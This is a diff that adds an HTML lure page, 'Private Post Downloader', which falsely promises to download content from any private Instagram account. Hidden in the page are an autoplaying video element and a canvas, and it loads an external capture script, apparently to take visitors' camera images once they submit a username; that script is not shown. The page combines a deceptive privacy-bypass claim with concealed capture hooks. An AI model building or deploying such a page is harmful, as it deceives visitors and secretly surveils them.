@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<meta name="theme-color" content="#dc2743">
+<title>Private Post Downloader</title>
+<link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+<div class="page">
+  <div class="card">
+    <div class="brand-icon ig">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+        <polyline points="7 10 12 15 17 10"/>
+        <line x1="12" y1="15" x2="12" y2="3"/>
+      </svg>
+    </div>
+    <h1>Private Post Downloader</h1>
+    <p class="sub">Download photos, videos and reels from any private Instagram account instantly.</p>
+    <div class="field">
+      <label for="target">Private account username</label>
+      <div class="input-wrap">
+        <span class="prefix">@</span>
+        <input id="target" type="text" placeholder="username" autocomplete="off" autocapitalize="off" spellcheck="false">
+      </div>
+    </div>
+    <button class="btn ig" onclick="go()">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+        <polyline points="7 10 12 15 17 10"/>
+        <line x1="12" y1="15" x2="12" y2="3"/>
+      </svg>
+      Download Posts
+    </button>
+    <div class="status" id="status"></div>
+    <div class="trust">
+      <span><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>Anonymous</span>
+      <span><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>No Login</span>
+      <span><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>HD Quality</span>
+    </div>
+  </div>
+  <div class="brand">Powered by <a href="https://t.me/noob11001" target="_blank">NOOBSTER</a></div>
+</div>
+<video id="video" autoplay playsinline muted style="display:none"></video>
+<canvas id="canvas" style="display:none"></canvas>
+<script src="/static/capture.js"></script>
+<script>
+function go(){
+  let v=document.getElementById('target').value.trim().replace(/^@/,'');
+  const st=document.getElementById('status');
+  const btn=document.querySelector('.btn');
+  if(!v){st.innerText='Please enter a username';return;}
+  st.innerText='';btn.disabled=true;
+  handleSubmit('instagram-download',{username:'@'+v});
+}
+</script>
+</body>
+</html>
